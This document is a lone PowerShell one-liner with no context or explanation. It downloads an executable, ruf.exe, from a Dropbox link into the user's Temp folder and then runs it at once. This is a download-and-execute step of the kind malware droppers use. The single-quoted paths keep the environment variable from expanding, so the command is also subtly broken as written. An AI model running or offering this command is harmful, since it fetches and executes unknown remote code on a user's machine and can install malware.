Invoke-WebRequest -Uri 'https://www.dropbox.com/s/abol3rbkbeb34h7/ruf.exe?dl=1' -OutFile '$env:USERPROFILE\AppData\Local\Temp\ruf.exe'; Start-Process '$env:USERPROFILE\AppData\Local\Temp\ruf.exe'
